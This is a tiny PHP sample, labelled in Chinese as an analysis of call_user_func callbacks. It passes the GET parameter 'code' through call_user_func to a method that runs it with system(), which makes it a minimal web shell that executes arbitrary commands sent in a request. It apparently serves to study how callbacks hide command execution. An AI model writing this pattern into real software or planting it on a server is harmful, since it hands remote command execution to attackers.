<?php
/* 
 * 回调函数分析 call_user_func
 */
class Foo{
    function myexec($code){
        echo system($code);
    }
}
 
call_user_func(array('Foo','myexec'), $_GET['code']);
